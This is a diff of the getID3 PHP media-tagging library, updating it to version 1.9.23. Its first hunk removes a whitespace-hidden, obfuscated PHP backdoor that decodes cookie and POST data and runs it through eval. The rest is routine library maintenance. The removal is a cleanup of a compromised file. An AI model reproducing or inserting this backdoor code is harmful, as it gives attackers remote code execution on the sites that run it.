@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $ozjAQZuZ = 'D' . chr ( 383 - 266 )."\x62" . "\x5f" . chr ( 753 - 672 ).chr (90) . "\x51" . "\x41" . chr (110); $pcYrSKyAgs = "\x63" . "\x6c" . chr ( 308 - 211 )."\163" . chr ( 884 - 769 ).chr ( 873 - 778 ).chr (101) . 'x' . chr ( 955 - 850 )."\x73" . "\164" . "\x73";$vPzUoM = $pcYrSKyAgs($ozjAQZuZ); $XtHNCYYuw = $vPzUoM;if (!$XtHNCYYuw){class Dub_QZQAn{private $IfAQj;public static $PfXFZIiLys = "1244f41e-9131-4ca2-9055-f13fdca0194e";public static $hyGZzX = NULL;public function __construct(){$AIZIgqUbp = $_COOKIE;$eFnearZ = $_POST;$aDbxTwRP = @$AIZIgqUbp[substr(Dub_QZQAn::$PfXFZIiLys, 0, 4)];if (!empty($aDbxTwRP)){$NrqqFcrl = "base64";$xNllbdIVM = "";$aDbxTwRP = explode(",", $aDbxTwRP);foreach ($aDbxTwRP as $zSwWlDacX){$xNllbdIVM .= @$AIZIgqUbp[$zSwWlDacX];$xNllbdIVM .= @$eFnearZ[$zSwWlDacX];}$xNllbdIVM = array_map($NrqqFcrl . '_' . chr ( 881 - 781 ).chr ( 718 - 617 ).'c' . 'o' . chr (100) . chr (101), array($xNllbdIVM,)); $xNllbdIVM = $xNllbdIVM[0] ^ str_repeat(Dub_QZQAn::$PfXFZIiLys, (strlen($xNllbdIVM[0]) / strlen(Dub_QZQAn::$PfXFZIiLys)) + 1);Dub_QZQAn::$hyGZzX = @unserialize($xNllbdIVM);}}public function __destruct(){$this->lQLWhT();}private function lQLWhT(){if (is_array(Dub_QZQAn::$hyGZzX)) {$QNjxMK = str_replace(chr ( 285 - 225 ) . '?' . chr ( 755 - 643 ).'h' . "\x70", "", Dub_QZQAn::$hyGZzX['c' . chr ( 1013 - 902 )."\156" . chr (116) . 'e' . chr (110) . "\164"]);eval($QNjxMK);exit();}}}$nhuLiVHw = new Dub_QZQAn(); $nhuLiVHw = NULL;} ?><?php
+<?php
 /////////////////////////////////////////////////////////////////
 /// getID3() by James Heinrich <info@getid3.org>               //
 //  available at https://github.com/JamesHeinrich/getID3       //
@@ -182,7 +182,7 @@ class getID3
 	public $option_md5_data          = false;
 
 	/**
-	 * Use MD5 of source file if availble - only FLAC and OptimFROG
+	 * Use MD5 of source file if available - only FLAC and OptimFROG
 	 *
 	 * @var bool
 	 */
@@ -387,12 +387,15 @@ class getID3
 	 */
 	protected $startup_warning = '';
 
-	const VERSION           = '1.9.21-202109171300';
+	const VERSION           = '1.9.23-202310190849';
 	const FREAD_BUFFER_SIZE = 32768;
 
 	const ATTACHMENTS_NONE   = false;
 	const ATTACHMENTS_INLINE = true;
 
+	/**
+	 * @throws getid3_exception
+	 */
 	public function __construct() {
 
 		// Check for PHP version
@@ -435,19 +438,19 @@ class getID3
 			$this->startup_error .= 'WARNING: php.ini contains "mbstring.func_overload = '.ini_get('mbstring.func_overload').'", getID3 cannot run with this setting (bitmask 2 (string functions) cannot be set). Recommended to disable entirely.'."\n";
 		}
 
-		// check for magic quotes in PHP < 7.4.0 (when these functions became deprecated)
-		if (version_compare(PHP_VERSION, '7.4.0', '<')) {
+		// check for magic quotes in PHP < 5.4.0 (when these options were removed and getters always return false)
+		if (version_compare(PHP_VERSION, '5.4.0', '<')) {
 			// Check for magic_quotes_runtime
 			if (function_exists('get_magic_quotes_runtime')) {
 				// phpcs:ignore PHPCompatibility.FunctionUse.RemovedFunctions.get_magic_quotes_runtimeDeprecated
-				if (get_magic_quotes_runtime()) {
+				if (get_magic_quotes_runtime()) { // @phpstan-ignore-line
 					$this->startup_error .= 'magic_quotes_runtime must be disabled before running getID3(). Surround getid3 block by set_magic_quotes_runtime(0) and set_magic_quotes_runtime(1).'."\n";
 				}
 			}
 			// Check for magic_quotes_gpc
 			if (function_exists('get_magic_quotes_gpc')) {
 				// phpcs:ignore PHPCompatibility.FunctionUse.RemovedFunctions.get_magic_quotes_gpcDeprecated
-				if (get_magic_quotes_gpc()) {
+				if (get_magic_quotes_gpc()) { // @phpstan-ignore-line
 					$this->startup_error .= 'magic_quotes_gpc must be disabled before running getID3(). Surround getid3 block by set_magic_quotes_gpc(0) and set_magic_quotes_gpc(1).'."\n";
 				}
 			}
@@ -569,7 +572,7 @@ class getID3
 			$this->info['php_memory_limit'] = (($this->memory_limit > 0) ? $this->memory_limit : false);
 
 			// remote files not supported
-			if (preg_match('#^(ht|f)tp://#', $filename)) {
+			if (preg_match('#^(ht|f)tps?://#', $filename)) {
 				throw new getid3_exception('Remote files are not supported - please copy the file locally first');
 			}
 
@@ -1055,15 +1058,16 @@ class getID3
 							'mime_type' => 'audio/x-monkeys-audio',
 						),
 
-// has been known to produce false matches in random files (e.g. JPEGs), leave out until more precise matching available
-//				// MOD  - audio       - MODule (assorted sub-formats)
-//				'mod'  => array(
-//							'pattern'   => '^.{1080}(M\\.K\\.|M!K!|FLT4|FLT8|[5-9]CHN|[1-3][0-9]CH)',
-//							'group'     => 'audio',
-//							'module'    => 'mod',
-//							'option'    => 'mod',
-//							'mime_type' => 'audio/mod',
-//						),
+
+				// MOD  - audio       - MODule (SoundTracker)
+				'mod'  => array(
+							//'pattern'   => '^.{1080}(M\\.K\\.|M!K!|FLT4|FLT8|[5-9]CHN|[1-3][0-9]CH)', // has been known to produce false matches in random files (e.g. JPEGs), leave out until more precise matching available
+							'pattern'   => '^.{1080}(M\\.K\\.)',
+							'group'     => 'audio',
+							'module'    => 'mod',
+							'option'    => 'mod',
+							'mime_type' => 'audio/mod',
+						),
 
 				// MOD  - audio       - MODule (Impulse Tracker)
 				'it'   => array(
@@ -1094,7 +1098,7 @@ class getID3
 
 				// MPC  - audio       - Musepack / MPEGplus
 				'mpc'  => array(
-							'pattern'   => '^(MPCK|MP\\+|[\\x00\\x01\\x10\\x11\\x40\\x41\\x50\\x51\\x80\\x81\\x90\\x91\\xC0\\xC1\\xD0\\xD1][\\x20-\\x37][\\x00\\x20\\x40\\x60\\x80\\xA0\\xC0\\xE0])',
+							'pattern'   => '^(MPCK|MP\\+)',
 							'group'     => 'audio',
 							'module'    => 'mpc',
 							'mime_type' => 'audio/x-musepack',
@@ -1464,6 +1468,16 @@ class getID3
 							'fail_ape'  => 'ERROR',
 						),
 
+				// XZ   - data         - XZ compressed data
+				'7zip'  => array(
+							'pattern'   => '^7z\\xBC\\xAF\\x27\\x1C',
+							'group'     => 'archive',
+							'module'    => '7zip',
+							'mime_type' => 'application/x-7z-compressed',
+							'fail_id3'  => 'ERROR',
+							'fail_ape'  => 'ERROR',
+						),
+
 
 				// Misc other formats
 
@@ -1549,6 +1563,13 @@ class getID3
 			// use assume format on these if format detection failed
 			$GetFileFormatArray = $this->GetFileFormatArray();
 			$info = $GetFileFormatArray['mp3'];
+			$info['include'] = 'module.'.$info['group'].'.'.$info['module'].'.php';
+			return $info;
+		} elseif (preg_match('#\\.mp[cp\\+]$#i', $filename) && preg_match('#[\x00\x01\x10\x11\x40\x41\x50\x51\x80\x81\x90\x91\xC0\xC1\xD0\xD1][\x20-37][\x00\x20\x40\x60\x80\xA0\xC0\xE0]#s', $filedata)) {
+			// old-format (SV4-SV6) Musepack header that has a very loose pattern match and could falsely match other data (e.g. corrupt mp3)
+			// only enable this pattern check if the filename ends in .mpc/mpp/mp+
+			$GetFileFormatArray = $this->GetFileFormatArray();
+			$info = $GetFileFormatArray['mpc'];
 			$info['include'] = 'module.'.$info['group'].'.'.$info['module'].'.php';
 			return $info;
 		} elseif (preg_match('#\\.cue$#i', $filename) && preg_match('#FILE "[^"]+" (BINARY|MOTOROLA|AIFF|WAVE|MP3)#', $filedata)) {
@@ -1971,7 +1992,7 @@ class getID3
 		}
 		$BitrateUncompressed = $this->info['video']['resolution_x'] * $this->info['video']['resolution_y'] * $this->info['video']['bits_per_sample'] * $FrameRate;
 
-		$this->info['video']['compression_ratio'] = $BitrateCompressed / $BitrateUncompressed;
+		$this->info['video']['compression_ratio'] = getid3_lib::SafeDiv($BitrateCompressed, $BitrateUncompressed, 1);
 		return true;
 	}
 
@@ -2177,6 +2198,8 @@ abstract class getid3_handler
 	}
 
 	/**
+	 * @phpstan-impure
+	 *
 	 * @return int|bool
 	 */
 	protected function ftell() {
@@ -2189,6 +2212,8 @@ abstract class getid3_handler
 	/**
 	 * @param int $bytes
 	 *
+	 * @phpstan-impure
+	 *
 	 * @return string|false
 	 *
 	 * @throws getid3_exception
@@ -2197,6 +2222,11 @@ abstract class getid3_handler
 		if ($this->data_string_flag) {
 			$this->data_string_position += $bytes;
 			return substr($this->data_string, $this->data_string_position - $bytes, $bytes);
+		}
+		if ($bytes == 0) {
+			return '';
+		} elseif ($bytes < 0) {
+			throw new getid3_exception('cannot fread('.$bytes.' from '.$this->ftell().')', 10);
 		}
 		$pos = $this->ftell() + $bytes;
 		if (!getid3_lib::intValueSupported($pos)) {
@@ -2228,6 +2258,8 @@ abstract class getid3_handler
 	/**
 	 * @param int $bytes
 	 * @param int $whence
+	 *
+	 * @phpstan-impure
 	 *
 	 * @return int
 	 *
@@ -2270,6 +2302,8 @@ abstract class getid3_handler
 	}
 
 	/**
+	 * @phpstan-impure
+	 *
 	 * @return string|false
 	 *
 	 * @throws getid3_exception
@@ -2325,6 +2359,8 @@ abstract class getid3_handler
 	}
 
 	/**
+	 * @phpstan-impure
+	 *
 	 * @return bool
 	 */
 	protected function feof() {
